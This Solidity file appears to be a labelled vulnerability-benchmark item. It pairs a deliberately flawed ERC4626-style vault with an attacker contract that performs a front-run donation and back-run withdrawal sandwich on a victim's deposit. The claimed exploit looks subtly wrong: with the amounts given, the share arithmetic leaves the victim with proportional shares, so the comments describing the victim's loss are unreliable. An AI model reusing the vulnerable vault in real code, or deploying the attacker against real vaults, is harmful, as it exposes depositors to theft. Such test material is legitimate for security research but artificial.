// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vault Share Price Manipulation
 * @notice BASELINE: Manipulating share price via front-running
 * @dev VULNERABLE: Attacker front-runs deposits
 *
 * ATTACK VECTOR:
 * 1. Victim queues large deposit
 * 2. Attacker sees pending tx in mempool
 * 3. Attacker front-runs: deposit small amount + donate large amount
 * 4. Share price inflates
 * 5. Victim's deposit executes at inflated price → gets fewer shares
 * 6. Attacker back-runs: withdraws at victim's expense
 *
 * METADATA:
 * - Category: defi
 * - Tier: advanced
 * - Safe: false
 * - Immunefi Level: 4 (High)
 * - Tags: ["erc4626", "front-running", "mev", "sandwich"]
 */
contract VaultShareManipulation {
    uint256 public totalAssets;
    uint256 public totalShares;

    mapping(address => uint256) public sharesOf;

    event Deposit(address user, uint256 assets, uint256 shares);
    event Withdraw(address user, uint256 assets, uint256 shares);

    function deposit(uint256 assets) public payable returns (uint256 shares) {
        require(msg.value == assets);

        if (totalShares == 0) {
            shares = assets;
        } else {
            shares = (assets * totalShares) / totalAssets;
        }

        require(shares > 0);

        totalAssets += assets;
        totalShares += shares;
        sharesOf[msg.sender] += shares;

        emit Deposit(msg.sender, assets, shares);
    }

    function withdraw(uint256 shares) public returns (uint256 assets) {
        require(sharesOf[msg.sender] >= shares);

        assets = (shares * totalAssets) / totalShares;

        sharesOf[msg.sender] -= shares;
        totalShares -= shares;
        totalAssets -= assets;

        payable(msg.sender).transfer(assets);

        emit Withdraw(msg.sender, assets, shares);
    }

    receive() external payable {
        totalAssets += msg.value;
    }
}

/**
 * @title Share Manipulation Attacker
 * @notice Front-runs victim's deposit
 */
contract ShareManipulationAttacker {
    VaultShareManipulation public vault;

    constructor(address _vault) {
        vault = VaultShareManipulation(_vault);
    }

    /**
     * @notice Execute sandwich attack on victim's deposit
     * Assumes victim is about to deposit 100 ETH
     */
    function frontRun() public payable {
        // Front-run: Deposit small amount
        vault.deposit{value: 1 ether}(1 ether);

        // Front-run: Donate to inflate share price
        payable(address(vault)).transfer(99 ether);

        // Now: Victim's deposit executes at inflated price
        // Victim gets fewer shares than expected
    }

    function backRun() public {
        // Back-run: Withdraw all shares
        // Profit from victim's deposit
        uint256 shares = vault.sharesOf(address(this));
        vault.withdraw(shares);
    }
}